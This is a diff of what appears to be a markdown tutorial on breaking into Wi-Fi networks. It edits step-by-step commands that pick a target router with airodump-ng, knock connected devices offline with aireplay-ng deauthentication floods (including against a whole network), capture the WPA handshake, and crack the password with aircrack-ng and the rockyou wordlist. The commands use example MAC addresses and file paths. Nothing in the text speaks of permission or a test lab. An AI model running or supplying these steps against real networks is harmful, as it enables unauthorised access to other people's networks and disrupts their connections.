@@ -171,7 +171,7 @@ airodump-ng wlan0
 * Copy bssid ofnetwork u like (bssid = mac address show on first row)
 *  also note the ch (channel number of same router)
 
-# step 3. To get that router 
+# step 3. Check devices connect to that network and capture Handshake-file 
 
 * --bssid => whom u going to attack
 * --channel => to give channel number if it or use [(-c) for channel but sometime it didn't work well ]
@@ -187,7 +187,7 @@ airodump-ng wlan0 --bssid -c -w /path/Meow.txt
 ```
 ## for an example
 ```bash
-airodump-ng wlan0 --bssid 3C:46:45:1D:5D:31 --channel 11  -w /home/death/text
+airodump-ng wlan0 --bssid 3C:46:45:1D:5D:31 --channel 11  -w /home/death/Meow.txt
 ```
 
 ![Screenshot 2023-10-17 221855](https://github.com/Esther7171/web-development/assets/122229257/e9ec3986-5e54-4bf3-9345-d90fc7057e33)
@@ -209,10 +209,13 @@ aireplay-ng wlan0 -a <bssid> -c <station>  -0 <number of packages>
 ```bash
 aireplay-ng wlan0 -a 3C:46:45:1D:5D:31 -c D4:36:89:A4:7R:29 --deauth 10
 ```  
-# To dos on whole network use :
+# To deauth on whole network use :
 ```bash
 aireplay-ng wlan0 -a <bssid> -0 <deauth n.o packages>
 ```
+## your handshake-file will be stored in the path u give 
+- .cap  is the file fo capture handshake .  In my case is Meow.txt.cap
+- so we going to crack it by aircrack-ng with wordlists.
 # step 5. Crack the password / handshake file.
 ### To crack capture handshake we using aircrack-ng fast cracking tool
 * -w to give wordlist.
@@ -221,7 +224,7 @@ aireplay-ng wlan0 -a <bssid> -0 <deauth n.o packages>
 * gzip -d /usr/share/wordlist/rockyou.txt (if it not)
 ![Screenshot 2023-10-17 225232](https://github.com/Esther7171/web-development/assets/122229257/c4fc707b-c3d0-46e4-a3b3-67bc1a041360)
  ```bash
-aircrack-ng text.cap -w /usr/share/rockyou.txt
+aircrack-ng Meow.txt.cap -w /usr/share/rockyou.txt
 ```
 
 ![Screenshot 2023-10-17 225248](https://github.com/Esther7171/web-development/assets/122229257/760fda9a-b63c-4b78-a45d-b087561de64a)
